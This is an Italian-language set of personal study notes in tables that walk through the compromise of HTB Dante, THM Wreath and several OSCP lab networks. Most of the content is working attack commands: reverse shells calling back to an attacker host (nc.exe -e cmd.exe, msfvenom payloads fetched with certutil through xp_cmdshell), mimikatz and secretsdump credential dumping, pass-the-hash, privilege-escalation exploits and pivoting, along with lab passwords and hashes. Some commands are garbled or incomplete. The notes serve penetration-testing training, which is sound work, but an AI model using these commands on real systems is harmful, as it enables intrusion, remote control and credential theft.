#### INDICE

- [[#Dante]]
- [[#Wreath]]
- [[#Secura]]
- [[#Medtech]]
- [[#Relia]]
- [[#OSCP Challenge A]]
- [[#OSCP Challenge B
- [[#OSCP Challenge C]]

---


### Dante

| üß† **Azione**                  | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                          | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                     |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Wordpress**                  | 1. `cewl URL > words.txt`<br>2. `docker run -it --rm -v /home/kali/htb:/mnt wpscanteam/wpscan --url http://IP_TARGET:65000/wordpress --passwords /mnt/words.txt --usernames /mnt/users.txt`                                                                                                      | Controllando il file `/robots.txt` notiamo che √® presente il servizio *Wordpress*. Facciamo una lista di nomi dalla pagina di contatto del team ed utilizziamo la *1.* per fare una lista di password con le parole di una pagina sul web.<br>Infine utilizziamo la *2.* per fare un bruteforce ed ottenere le credenziali `james:Toyota` |
| **Rerverse Shell**             |                                                                                                                                                                                                                                                                                                  | Entriamo dentro Wordpress ed andiamo su APPEREANCE > THEME EDITOR > 404.PHP ed inseriamo la reverse shell in PHP. Infine navighiamo `/wordpress/wp-content/themes/twentynineteen/404.php` per avviare la reverse shell                                                                                                                    |
| **Credential Reused**          |                                                                                                                                                                                                                                                                                                  | Passiamo da utenti `www-data` a `james` con le credenziali precedentemente trovate. Poi guardando il contenuto del file `.bash_history` troviamo le credenziali `balthazar:TheJoker12345!`                                                                                                                                                |
| **SUID**                       | 1. `./find . -exec /bin/sh -p \; -quit`                                                                                                                                                                                                                                                          | Tra i file SUID troviamo `find` che √® vulnerabile secondo [GTFObins](https://gtfobins.github.io/gtfobins/find/#suid). Utilizziamo la *1.* per diventare root                                                                                                                                                                              |
| **---------**                  | **------------------------------------------------**                                                                                                                                                                                                                                             | **------------------------------------------------**                                                                                                                                                                                                                                                                                      |
| **Proxychains**                | 1. `ssh -i id_rsa -D 1080 root@IP_TARGET`                                                                                                                                                                                                                                                        | Inseriamo nel file `/etc/proxychains` la riga `socks5 127.0.0.1 1080` ed entriamo con la *1.* sulla macchina compromessa. Adesso possiamo effettuare qualsiasi comando dalla nostra macchina ma come se fossimo sulla macchina compromessa                                                                                                |
| **Ping**                       | 1. `for i in {1..255} ;do (ping -c 1 172.16.1.$i \| grep "bytes from"\|cut -d ' ' -f4\|tr -d ':' &);done`                                                                                                                                                                                        | Facciamo un `ping` dalla macchina compromessa per vedere quali macchine sono attive.                                                                                                                                                                                                                                                      |
| **LFI**                        | 1. `proxychains firefox`<br>2. ![[Pasted image 20250826115013.png]]<br>3. `curl "172.16.1.10/nav.php?page=php://filter/convert.base64-`<br>`encode/resource=/var/www/html/wordpress/wp-config.php" \| base64 -d > wp-`<br>`config.php`                                                           | Utilizziamo la *1.* per aprire un `firefox` che raggiunga le altre macchine. Scopriamo che l'indirizzo `172.16.1.10` √® attivo. E' presente il servizio √® vulnerabile a *LFI*. Poich√© utilizza *Wordpress* utilizziamo la *3.* per ottenere le credenziali di `magaret`                                                                    |
| **JSON**                       |                                                                                                                                                                                                                                                                                                  | Troviamo il file `/.config/Slack/exported_data/secure/2020-05-18.json` erano presente le credenziali di `frank`                                                                                                                                                                                                                           |
| **Hijacking**                  | 1. `echo -n "import os\nos.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")"`                                                                                                                                                                                                                      | Nella cartella dell'utente `frank` √® presente il file `apache_restart.py`. Avviando `pspy64s` notiamo che il file viene eseguito come root. Inseriamo un file malevolo con la *1.* in una libreria che viene richiamata                                                                                                                   |
| **---------**                  | **------------------------------------------------**                                                                                                                                                                                                                                             | **------------------------------------------------**                                                                                                                                                                                                                                                                                      |
| **Webmin 1.9**                 | 1. `proxychains python webmin_exploit.py --rhost 172.16.1.17 --lhost IP_KALI --lport 1234 -u admin -p Password6543`                                                                                                                                                                              | Passando all'indirizzo `172.16.1.17` dove √® presente il servizio *Webmin 1.9*. Utilizziamo *1.* per compromettere la macchina                                                                                                                                                                                                             |
| **---------**                  | **------------------------------------------------**                                                                                                                                                                                                                                             | **------------------------------------------------**                                                                                                                                                                                                                                                                                      |
| **Fuzzing Directories**        | 1. `feroxbuster -u "http://172.16.1.13" --proxy "socks5://127.0.0.1:1080/" -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-big.txt -C 404 -x php,txt,bak`                                                                                                       | Sull'indirizzo `172.16.1.13` applichiamo del fuzzing directories con la *1.*                                                                                                                                                                                                                                                              |
| **Technical Discussion Forum** |                                                                                                                                                                                                                                                                                                  | Sulla porta `80` scopriamo il servizio *Technical Discussion Forum* che √® vulnerabile a [RCE](https://www.exploit-db.com/exploits/48512). Durante la fase di registrazione carichiamo una reverse shell in PHP e poi navighiamo `/discuss/ups/shell.php` per avviarla                                                                     |
| **Druva 6.6.3**                | 1. `powershell wget IP_KALI/nc.exe -o C:\xampp\htdocs\discuss\ups\nc.exe`<br>2. `C:\python27\python.exe druva.py "windows\system32\cmd.exe /C C:\xampp\htdocs\discuss\ups\nc.exe IP_KALI LPORT -e cmd.exe"`                                                                                      | Tra i file insoliti in `C:\Program Files (x86)` troviamo *Druva* da cui ci ricaviamo la sua versione dal file `C:\Program Files (x86)\Druva\inSync\licence.txt`. E' vulnerabile privesc [CVE-2020-5752](https://nvd.nist.gov/vuln/detail/CVE-2020-5752). Carichiamo `nc.exe` sulla macchina con la *1.* ed avviamo l'exploit con la *2.*  |
| **---------**                  | **------------------------------------------------**                                                                                                                                                                                                                                             | **------------------------------------------------**                                                                                                                                                                                                                                                                                      |
| **Fuzzing Directories**        | 1. `feroxbuster -u "http://172.16.1.12" --proxy "socks5://127.0.0.1:1080/" -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-big.txt -C 404 -x php,txt,bak`                                                                                                       | Sull'indirizzo `172.16.1.12` applichiamo del fuzzing directories con la *1.*                                                                                                                                                                                                                                                              |
| **SQL Injection**              | 1. `proxychains sqlmap -u http://IP_TARGET/myblogadmin?id=1' --dbms --batch`                                                                                                                                                                                                                     | Sulla porta `80` troviamo il servizio *Adminblog*. Notiamo che √® vulnerabile a *SQL Injection* sul parametro `id` dunque utilizziamo la *1.* per estrarre informazioni dal database ed ottenere credenziali                                                                                                                               |
| **SUDO**                       | 1. `sudo -u#1 /bin/bash`                                                                                                                                                                                                                                                                         | Con le credenziali ottenute entriamo come utente `ben`. Controllando i permessi SUDO notiamo che pu√≤ eseguire `(ALL,!root) /bin/bash` e questo lo rende vulnerabile a privesc [CVE-2019-14287](https://www.exploit-db.com/exploits/47502). Utilizziamo la *1.* per diventare utenti root                                                  |
| **---------**                  | **------------------------------------------------**                                                                                                                                                                                                                                             | **------------------------------------------------**                                                                                                                                                                                                                                                                                      |
| **Windows Server 2012 R2**     | 1. `proxychains msfconsole`<br>2. `set payload windows/x64/meterpreter/reverse_tcp`<br>3. `shell`                                                                                                                                                                                                | Il sistema operativo *Windows Server 2012 R2* dell'ip `172.16.1.20` √® vulnerabile a *Eternal Blue*. Utilizziamo la *1.* e la *2.* per avviare una reverse shell                                                                                                                                                                           |
| **Comments**                   | 1. `net /user mrb3n`                                                                                                                                                                                                                                                                             | Utilizziamo la *1.* e notiamo un commento che ci rivela la password di `mrb3n`                                                                                                                                                                                                                                                            |
| **---------**                  | **------------------------------------------------**                                                                                                                                                                                                                                             | **------------------------------------------------**                                                                                                                                                                                                                                                                                      |
| **Bruteforce**                 | 1. ![[Pasted image 20250827111759.png]]<br>2. `for i in {1..255}; do echo "WestminsterOrange$i" >> pass.txt; done`                                                                                                                                                                               | Con le credenziali trovate sul file `employees` proviamo un bruteforce sull'indirizzo IP `172.16.1.101` scopriamo che possiamo entrare con `dharding` e scopriamo il messaggio nella *1.*. Capiamo che per ottenere l'accesso dobbiamo utilizzare la *2.*                                                                                 |
| **Bin Path**                   | 1. `.\Get-ServiceAcl.ps1 "IObitUnSvr" \| Get-ServiceAcl \| select -ExpandProperty Access`<br>2. `sc.exe config IObitUnSvr binPath= "cmd.exe /c C:\Users\dharding\Documents\nc.exe -e cmd.exe IP_KALI 3333"`<br>3. `upload nc.exe`<br>4. `sc.exe stop IObitUnSvr`<br>5. `sc.exe start IObitUnSvr` | Utilizziamo la *1.* e scopriamo che l'utente attuale ha i permessi per avviare e fermare il servizio. Carichiamo con la *2.* `nc.exe`, modifichiamo il path binario con la *3.* e ed riavviamo con la *4.* e *5.*                                                                                                                         |
| **---------**                  | **------------------------------------------------**                                                                                                                                                                                                                                             | **------------------------------------------------**                                                                                                                                                                                                                                                                                      |
|                                |                                                                                                                                                                                                                                                                                                  |                                                                                                                                                                                                                                                                                                                                           |


- [writeup](https://www.studocu.id/id/document/politeknik-caltex-riau/teknik-infformatika/dante-htb-this-one-is-documentation-of-pro-labs-htb/75397465?origin=home-recent-1)

---

### Wreath

| üß† Azione        | üíª Comando / Metodo                                                                                                                                                                                                      | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                        |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Webmin 1.920** | 1. `./CVE-2019-15107.py IP_TARGET`                                                                                                                                                                                       | Sulla porta 10000 notiamo il servizio *Webmin 1.920* che secondo git √® vulnerabile a [RCE](https://github.com/MuirlandOracle/CVE-2019-15107). Dopo aver scaricato il tool utilizziamo la *1.* per avviare una reverse shell                                                                                                                                              |
| **Nmap**         | 1. `for i {1..255}; do (ping -c IP_TARGET0-255); done grep -i "from bytes"`<br>2. `./nmap_static -sn 10.200.188.1/24 --exclude 10.200.188.1,10.200.188.250`                                                              | Sulla macchina target esegue la *1.* per vedere le macchine raggiungibili. Poi scarica [nmap-static](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) sulla macchina target e scansione gli IP trovati come in *2.*                                                                                                                   |
| **Shuttle**      | 1. `sshuttle -r root@thomaswreath.thm -e 'ssh -i id_rsa' -N`                                                                                                                                                             | Utilizziamo la *1.* per trasferire i servizi non raggiungibili sulla nostra macchina attaccante                                                                                                                                                                                                                                                                          |
| **GitStack**     | 1. `python3 exploit.py`<br>2. `firewall-cmd --zone=public --add-port 31337/tcp`<br>3. `./socat_fwd tcp-listen:31337 tcp:10.50.185.80:9001 &`<br>4. `rlwrap nc -lvnp 9001`<br>5. ![[Pasted image 20250805123037.png]]<br> | Su una delle macchine interne targets √® presente il servizio *GitStack* che √® vulnerabile a [RCE](https://github.com/snix0/GitStack-RCE-Exploit-Shell). Avviamo l'exploit con la *1.*, utilizziamo la *2.* per aaprire una nuova porta sul firewall, la *3.* e la *4.* per reindirizzare il traffico tramite socat sulla nostra macchina. La *5.* √® la verse shell in PS |
| **Mimikatz**     | 1. `.\mimikatz.exe`<br>2. `privilege::debug`<br>3. `token::elevate`<br>4. `lsadump::sam`<br>5. `hashcat '02d90eda8f6b6b06c32d5f207831101f' -m 1000 -a 0 /usr/share/wordlists/rockyou.txt`                                | Una volta entrati con al reverse shell, carichiamo `mimikatz.exe` ed usiamo la *1.* per avviarlo. Utilizziamo la *2.* per abilitarci a leggere la memoria `lsass.exe`, la *3.* per impersonare qualcuno con privilegi elevati e la *4.* per estrarre gli NTLM degli utenti. Troviamo NTLM dell'utente `thomas`. Utilizziamo la *5.* per craccarlo                        |


- [writeup](https://github.com/0xaniketB/TryHackMe-Wreath)

---
### Secura

| üß† Azione               | üíª Comando / Metodo                                                                                                                                                                                                                                               | üìù Output / Scopo                                                                                                                                                                                             |
| ----------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Password Spraying**   | 1. `nxc winrm <IP_TARGET> -u <USERNAME>  -p '<PASSWORD>'`<br>2. `evil-winrm -i <IP_TARGET> -u <USERNAME> -p '<PASSWORD>'`                                                                                                                                         | Pratichiamo password spraying con le credenziali che ci hanno fornito                                                                                                                                         |
| **SAM & SYSTEM**        | 1. `reg save HKLM\SAM C:\users\administrator\videos\sam.save`<br>2. `reg save HKLM\SYSTEM C:\users\administrator\videos\system.save`<br>3. `download sam.save`<br>4. `download system.save`<br>5. `impacket-secretsdump -sam sam.seve -ssytem -system.save LOCAL` | Scarichiamo con la *3.* e *4.* i file in locale contenente gli NTLM del sistema                                                                                                                               |
| **Mimikatz.exe**        | 1. `impacket-psexec -hashes "NTLM" administrator@IP_TARGET>`<br>2. `upload mimikatz.exe`<br>3. *MIMIKATZ*`sekurlsa::logonpassords`                                                                                                                                | Entriamo con una nuova shell pi√π permissiva con la *1.* e carichiamo sul target `mimikatz.exe` con la *2.* cos√¨ da scaricare le credenziali locali con la *3.*. Otteniamo le credenziali `credman:New2Era4.!` |
| **WinPEASany_ofs.exe**  | 1. `.\winPEASany_ofs.exe`<br>2. `python3 -m venv venv`<br>3. `source venv/bin/activate`<br>4. `python3 firepwd.py key3.db -v 4`                                                                                                                                   | Con la *1.* carichiamo `winPEASany_ofs.exe` e scopriamo un database da decriptare con la *4.*. Non troviamo nulla di interessante                                                                             |
| **Bloodhound**          | 1. `bloodhound-python -c all --dns-tcp --dns-timeout 20 -dc DOMAIN -u 'USERNAME' -p 'PASS' -d secura.yzx -v -ns IP_TARGET`<br>2. `neo4j console`<br>3. `bloodhound`<br>4. `nxc smb <IP_TARGET> -u <USERNAME> -p '<PASSWORD>' --local-auth --shares`               | Scarichiamo con la *1.* i dettagli su AD e con la *2.* e *3.* avviamo `bloodhound`. Con la *3.*                                                                                                               |
| **IBD File**            | 1. `download creds.ibd`<br>2. `strings creds.ibd`                                                                                                                                                                                                                 | Su `C:\xampp\mysql\data\creds` troviamo il file `creds.ibd` che scarichiamo con la *1.* in locale e poi leggiamone il contenuto con la *2.* e troviamo delle credenziali                                      |
| **NTDS.dit Extraction** | 1. `impacket-secretsdump '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_DOMAIN>' -dc-ip <IP_DC>`<br>2. `evil-winrm -i <IP_TARGET> -u <USERNAME> -H <NTLM>`                                                                                                                   | Con le credenziali trovate estraiamo gli NTLM idal file `NTDS.dit` con la *1.* ed utilizziamolo per entrare come amministratore con la *2.*                                                                   |

---
### Medtech

| üß† Azione                  | üíª Comando / Metodo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                               |
| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SQL Injection**          | 1. `sqlmap -r item --batch`<br>2. `sqlmap -r item --dbms=mssql --os-pwn --batch`<br>3. `shell`<br><br>===== Versione manuale ====<br><br>1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_KALI> LPORT=80 -f exe -o shell.exe`<br>2. `'; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- -`<br>3. `';exec xp_cmdshell 'certutil -urlcache -f http://<IP_KALI>/shell.exe c:/temp/shell.exe';--`<br>4. `';exec xp_cmdshell 'c:/temp/shell.exe';--`<br> | Scopriamo con la *1.* che il parametro per lo username √® vulnerabile a SQL injection dunque usiamo la *2.* e *3.* per avviare una shell in remoto<br><br>Creiamo una shell con la *1.*, abilito la shell con la *2.*, carica la shell con la *3.* e con la *4.* la avviamo                                                                                                      |
| **SeImpersonatePrivilege** | 1. `whoami /all`<br>2. `certutil -split -urlcache -f http://<IP_KALI>/PrintSpoofer64.exe`<br>3. `PrintSpoofer64.exe -i -c powershell`                                                                                                                                                                                                                                                                                                                                                                                           | Controllando i permessi con la *1.* notiamo che l'utente ha abilitato i permessi *SeImpersonatePrivilege*. Scarichiamo sulla macchina target [PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases) con la *2.* e poi diventiamo amministratori con la *3.*                                                                                                       |
| **Port Forwarding**        | 1. `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`<br>2. `systemctl start ssh`<br>3. *TARGET*`ssh kali@<IP_KALI> -R <LPORT>`<br>4. `proxychains -q nxc smb ./ip.txt -u <USER> -p <PASS>`<br>                                                                                                                                                                                                                                                                       | Utilizziamo la *1.* per attivare il servizio RDP. Attiviamo il servizio SSH sulla nostra kali con la *2.* e poi facciamo un port forwarding con la *3.* dalla macchina target. Inoltre ricordiamoci di aggiungere la porta `<LPORT>` sul file `/etc/procychains4.conf` nel modo `127.0.0.1 <LPORT>`. <br>Utilizziamo la *4.* per provare gli accessi dalla macchina compromessa |
| **Logs file**              | 1. `proxychains -q evil-winrm -i <IP_TARGET> -u <USER> -p <PASS>`<br>2. `for proto in {smb,ssh,ldap,ftp,wmi,winrm,rdp,vnc,mssql,nfs}; do proxychains -q nxc $proto ip.txt -u <USER> -H "<HASH>"; done`<br>3. `proxychains -q evil-winrm -i 172.16.217.83 -u wario -H fdf36048c1cf88f5630381c5e38feb8e`<br>                                                                                                                                                                                                                      | Con la *1.* accediamo ad una macchina interna con le credenziali `joe:Flowers1`. Troviamo un file di logs contenente gli hash degli utenti. Utilizziamo la one-liner in *2.* per vedere che abbiamo accesso ad una macchina. Con la *3.* effettuiamo l'accesso                                                                                                                  |
| **DLL Hijacking**          | 1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_KALI> LPORT=80 -f exe -o AuditTracker.exe`<br>2. `certutil -split -urlcache -f http://<IP_KALI>`<br>3. `sc.exe start AuditTracker.exe`                                                                                                                                                                                                                                                                                                                                  | Dalla scnasione di `winPEAS.exe` e troviamo che √® vulnerabile a *DLL Hijacking*. Creiamo una reverse shell con la *1.*, carichiamola sul target col nome della DLL vulnerabile ed eseguiamola con la *3.*                                                                                                                                                                       |
| **Credentials**            | 1. `proxychains -q impacket-psexec medtech.com/<USER>:'<PASS>'@<IP_TARGET>`                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Troviamo le credenziali esposte dell'utente `offsec` e con la *1.* entriamo in un'altra macchina target                                                                                                                                                                                                                                                                         |
- [writeup](https://red6380.github.io/oscp1/) 

---
### Relia

| üß† Azione                                | üíª Comando / Metodo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | üìù Output / Scopo                                                                                                                                                                                                                                                                             |
| ---------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Path Traversal**                       | 1. ```curl -s --path-as-is -d "echo Content-Type: <br>text/plain; echo; whoami" "http://<IP_TARGET>:8000/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/<br>%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd";```<br>2. ```curl -s --path-as-is -d "echo Content-Type: <br>text/plain; echo; whoami" "http://192.168.132.245:8000/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/<br>%2e%2e/%2e%2e/%2e%2e/<br>home/anita/.ssh/id_ecdsa";```<br>3. `ssh2john anita_id_ecdsa > anita_ssh.hash`<br>4. `john anita_ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt`<br>5. `chmod 600 anita_id_edcsa`<br>6. `ssh -i anita_id_edcsa anita@<IP_TARGET>`<br> | Il sito √® vulnerabile a *path traversal*. Utilizziamo la *1.* per ottenere gli utenti e la *2.* per ottenere la chiave SSH privata dell'utente anita.<br>Cracchiamo la chiave privata con la *3.* e *4.* ed effettuiamo l'accesso con la *6.* al servizio SSH tramite chiave privata          |
| **Sudo Baron SAmedit<br>CVE-2021-3156 ** | 1. `python3 exploit_nss.py`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Una volta dentro scopriamo con linpeas che il target √® vulnerabile a <br>*CVE-2021-3156*, dunque scarichiamo l'[exploit](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py) sul target ed avviamolo                                                                           |
| **SeImpersonatePrivilege**               | 1. `.\GodPotato-NET4.exe -cmd "C:\temp\nc64.exe <IP_KALI> <KALI_PORT> -e cmd.exe"`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | Carichiamo una reverse shell in `.aspx` per `192.168.132.248` e navighiamola. Una votla dentro utilizziamo [GodPotato.exe](https://github.com/BeichenDream/GodPotato/releases) e [nc64.exe](https://github.com/int0x33/nc.exe/) con la *1.* per avviare una reverse shell come amministratore |

### OSCP Challenge A

| üß† Azione              | üíª Comando / Metodo                                                                                                                                                                                                             | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                             |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|                        | **---------------------- 192.168.X.141 ----------------------**                                                                                                                                                                 |                                                                                                                                                                                                                                                                                                                                                                                               |
| **RCE**                | <br>1. `python3 50801.py http://<IP_TARGET>:81`<br>2. `msfvenom -p python/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=<LPORT> -o shell.exe`<br>3. `certutil -urlcache -split -f http://<IP_KALI>/shell.exe`<br>4. `shell.exe` | Scopriamo che `192.168.132.141` utilizza il servizio *Attendance and Payroll* che √® vulnerabile a [RCE](https://www.exploit-db.com/exploits/50801). Modifichiamo il file in modo da adattare la webroot corretta ed otteniamo l'accesso alla macchina. Utilizziamo la *2.* per creare una reverse shell da caricare sulla macchina con la *3.* ed infine avviamo la reverse shell con la *4.* |
| **PrintSpoofer64.exe** | 1. `PrintSpoofer64.exe -i -c powershell`                                                                                                                                                                                        | Scarichiamo [PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases) sulla macchina target e diventiamo amministratori con la *1.*                                                                                                                                                                                                                                                |
| **Users NTLM**         | 1. `.\mimikatz.exe`<br>2. `privilege::debug`<br>3. `sekurlsa::logonpasswords`<br>4. `lsadump::sam"`<br>5. `"lsadump:secrets"`                                                                                                   | Carichiamo sulla macchina target *mimikatz.exe* ed avviamolo con la *1.*, infine usiamo *2.-5.* per ottenere gli NTLM e craccarli con [crackstation.net](https://crackstation.net/). <br>Otteniamo le credenziali `support:Freedom1` e `Administrator:December31`                                                                                                                             |
| **Discovery**          | 1. `Get-ChildItem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`                                                                                                                                        | Controlliamo se esistono file `.txt` con la *1.*                                                                                                                                                                                                                                                                                                                                              |
| **Proxychains**        | 1. `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`<br>2. `systemctl start ssh`<br>3. `ssh kali@<IP_KALI>`                                                          | Attiviamo con la *1.* il protocollo RDP ed accediamo con *remmina* usando le credenziali amministrative. Utilizziamo la *3.* per avviare una connessione con la nostra kali                                                                                                                                                                                                                   |
|                        | **----------------------10.10.X.140 ----------------------**                                                                                                                                                                    |                                                                                                                                                                                                                                                                                                                                                                                               |
| **Access**             | 1. `proxychains -q nxc_access.sh -u users.txt -H <HASH> -t ip.txt`<br>2. `proxychains -q evil-winrm -u celia.almeda -H <HASH> -i <IP_TARGET>`<br>                                                                               | Con il nostro tool [[nxc_access.sh]] vediamo che abbiamo accesso come utente `celia.almeda` tramite *1.* ed entriamo con la *2.*                                                                                                                                                                                                                                                              |
| **NTLM Hash**          | 1. `upload mimikatz.exe`<br>2. `privilege::debug`<br>3. `sekurlsa::logonpasswords`<br>4. `lsadump::sam"`<br>5. `"lsadump:secrets"`                                                                                              | Controlliamo gli hash presenti caricando *mimikatz.exe* con la *1.* ed eseguendo dalla *2.-5.*                                                                                                                                                                                                                                                                                                |
| **SAM & SYSTEM**       | 1. `download SAM`<br>2. `download SYSTEM`                                                                                                                                                                                       | Scarichiamo da `C:\windows.old\windows\system32` i file `SAM` e `SYSTEM` con la *1.* e *2.*                                                                                                                                                                                                                                                                                                   |
|                        | **--------------------- 192.168.176.143 ---------------------**                                                                                                                                                                 |                                                                                                                                                                                                                                                                                                                                                                                               |
| **Aerospike RCE**      | 1. `python cve2020-13151.py --ahost <IP_TARGET> --pythonshell --lhost=<IP_KALI> --lport=80`                                                                                                                                     | Applicando del fuzzing directories troviamo il percorso `/api/heartbeat` e scopriamo il servizio database *Aerospike* che √® vulnerabile a [CVE-2020-13151](git clone https://github.com/b4ny4n/CVE-2020-13151) . <br>Utilizziamo la *1.* per sfruttare la vulnerabilit√† ed avviare una reverse shell sulla porta 80 della nostra kali                                                         |
| **SUID screen-4.5.0**  | 1. `find / -perm -4000 2>/dev/null`<br>2. `./exploit.sh`                                                                                                                                                                        | Con la *1.* cerchiamo tra i file SUID e troviamo `screen-4.5.0` che scopriamo essere vulnerabile a [privileges escalation](https://www.exploit-db.com/exploits/41154). <br><br>*NB:* sostituire `gcc` con `gcc-9`<br>                                                                                                                                                                         |
|                        | **--------------------- 192.168.X.144 -----------------------**                                                                                                                                                                 |                                                                                                                                                                                                                                                                                                                                                                                               |
| **Git**                | 1. `python3 git-dumper.py http://<IP_TARGET>/.git .`<br>2. `git log`<br>3. `git show <COMMIT>`<br>                                                                                                                              | Applicando del fuzzing directories troviamo la cartella `/.git` contenente tutte le modifiche al codice. Utilizziamo [git-dumper.py](https://github.com/arthaud/git-dumper) con la *1.* per scaricare tutto in locale e la *2.* per vedere i logs. Con la *3.* vediamo una modifica contenente le credenziali                                                                                 |
| **Cracking**           | 1. `scp stuart@<IP_TARGET>:/opt/backup/sitebackup3.zip .`<br>2. `zip2john sitebackup3.zip > 3.txt`<br>3. `sudo su`                                                                                                              | Cracchiamo la password dell'utente `chloe:Ee24zIK4cDhJHL4H`                                                                                                                                                                                                                                                                                                                                   |
|                        | 1. ``                                                                                                                                                                                                                           |                                                                                                                                                                                                                                                                                                                                                                                               |


---

### OSCP Challenge B

| üß† Azione       | üíª Comando / Metodo                                                                                                                                                                                                                                     | üìù Output / Scopo                                                                                                                                                                                                                                                                |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SNMP**        | 1. `snmpwalk -c public -v1 -t 10 <IP_TARGET> -Oa`<br>2. `ftp 192.168.132.147`<br>3. `chmod 600 id_rsa`<br>4. `ssh -i id_rsa john@<IP_TARGET>`                                                                                                           | Con la *1.* analizziamo il traffico UDP e scopriamo due utenza. Inserendo `kiero:kiero` riusciamo ad accedere al servizio FTP della macchina `192.168.132.147` da cui scarichiamo la chiave privata dell'utente `john`                                                           |
| **NTLM Hashes** | 1. `.\Rubeus-1.5.0.exe kerberoast /outfile:hashes.kerberoast`<br>2. `scp hashes.kerberoast kali@IP_KALI:\tmp`<br>3. `hashcat -m 13100 hashes.kerberoast /usr/share/wordlsits/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`               | Entriamo sulla macchina `192.168.132.147` tramite servizio SSH ed utilizziamo [Rubeus.exe](https://github.com/B1t0n/Rubeus-compiled/blob/master/Rubeus-1.4.1.exe) sulla macchina. Dopo aver ottenuto gli NTLM scarichiamoli in locale con la *2.* e poi cracchiamoli con la *3.* |
| **MSSQL**       | 1. `ssh kali@<IP_KALI> -R <LPORT>`<br>2. `proxychains -q impacket-mssqlclient sql_svc@IP_TARGET -windows-auth`<br>3. `EXEC sp_configure 'show advanced options, 1;`<br>4. `RECONFIGURE;`<br>5. `EXEC sp_configure 'xp_cmdshell',1;`<br>6. `RECONFIGURE` | Ora che abbiamo compromesso una macchina utilizziamola per accedere alle altre. Utilizziamo la *1.* per fare port forwarding sulla kali ed usiamo la *2.* per accedere come utente `sql_svc`. Usiamo la *3.*,*4.*,*5.* e *6.* per avviare una shell                              |

### OSCP Challenge C

| üß† Azione            | üíª Comando / Metodo                                                                                                             | üìù Output / Scopo                                                                                                                                                                                                                                                                                            |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Database File**    |                                                                                                                                 | Applicando un fuzzing sull'ip `192.168.132.153:8000` otteniamo il file `db` con delle credenziali. Usiamo `sqlitebrowser` per aprirlo                                                                                                                                                                        |
| **admintool.exe**    | 1. `nxc ssh -u <USER.TXT> -p <PASS.TXT> -t <IPs.TXT>`<br>2. `scp <USER>@<IP_TARGET>:/<RPATH> ./`<br>3. `ssh <USER>@<IP_TARGET>` | Usiamo la *1.* per vedere che `support` ha accesso come servizio SSH. Una volta entrati usiamo la *2.* per scaricare il file sospetto `admintool.exe` e dal contenuto otteniamo le credenziali `administrator:December31`. Entriamo con le credenziali tramite SSH con la *3.*                               |
